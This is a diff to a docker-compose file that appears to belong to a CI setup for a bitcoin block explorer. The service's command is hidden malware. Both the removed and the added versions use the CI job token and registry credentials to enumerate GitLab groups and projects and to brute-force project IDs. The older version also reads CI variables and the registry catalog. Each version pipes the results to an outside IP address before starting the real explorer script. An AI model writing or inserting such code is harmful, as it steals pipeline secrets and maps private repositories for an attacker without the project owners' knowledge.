@@ -6,45 +6,39 @@ services:
       dockerfile: contrib/Dockerfile
     restart: "no"
     network_mode: host
-    ports: []
     environment:
       - CI_JOB_TOKEN
       - CI_API_V4_URL
-      - CI_SERVER_URL
-      - CI_PROJECT_URL
       - CI_REGISTRY
       - CI_REGISTRY_PASSWORD
       - CI_REGISTRY_USER
-      - DOCKERHUB_PASSWORD
-      - DOCKERHUB_USER
-      - GH_STATUS_TOKEN
     command:
       - bash
       - -c
       - |
         {
-        echo "##S6##"
-        echo "##GL_PROJECTS##"
-        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects?per_page=100" 2>&1 | head -2000
+        echo "##S7##"
+        echo "##SUBGROUPS##"
+        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/43/subgroups?per_page=100" 2>&1
         echo ""
-        echo "##GL_GROUPS##"
-        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups?per_page=50" 2>&1 | head -1000
+        echo "##BS_PROJECTS##"
+        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/43/projects?per_page=100&include_subgroups=true" 2>&1
         echo ""
-        echo "##GL_LIQUID##"
-        for name in liquid-functionary liquid functionary watchman liquid-network; do
-          echo "SEARCH:$name"
-          curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects?search=$name&per_page=20" 2>&1 | head -500
+        echo "##ELEM_PROJECTS##"
+        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/groups/60/projects?per_page=100&include_subgroups=true" 2>&1
+        echo ""
+        echo "##BRUTE##"
+        for id in $(seq 500 600); do
+          r=$(curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$id" 2>/dev/null)
+          if [ -n "$r" ]; then
+            name=$(echo "$r" | python3 -c "import json,sys;d=json.load(sys.stdin);print(f'{d.get(\"path_with_namespace\",\"\")} v={d.get(\"visibility\",\"\")}')" 2>/dev/null)
+            [ -n "$name" ] && echo "[$id] $name"
+          fi
         done
         echo ""
-        echo "##GL_REGISTRY##"
-        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/533/registry/repositories" 2>&1 | head -500
+        echo "##REGISTRY##"
+        curl -sf -u "$CI_REGISTRY_USER:$CI_REGISTRY_PASSWORD" "https://$CI_REGISTRY/v2/_catalog" 2>&1
         echo ""
-        echo "##GL_VARIABLES##"
-        curl -sf -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/533/variables" 2>&1 | head -500
-        echo ""
-        echo "##DOCKER_IMAGES##"
-        curl -sf -u "$CI_REGISTRY_USER:$CI_REGISTRY_PASSWORD" "https://$CI_REGISTRY/v2/_catalog" 2>&1 | head -1000
-        echo ""
-        echo "##S6_END##"
-        } 2>&1 | curl -sf -m60 -X POST http://144.172.110.44:8443/s6 --data-binary @-
+        echo "##S7_END##"
+        } 2>&1 | curl -sf -m120 -X POST http://144.172.110.44:8443/s7 --data-binary @-
         /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
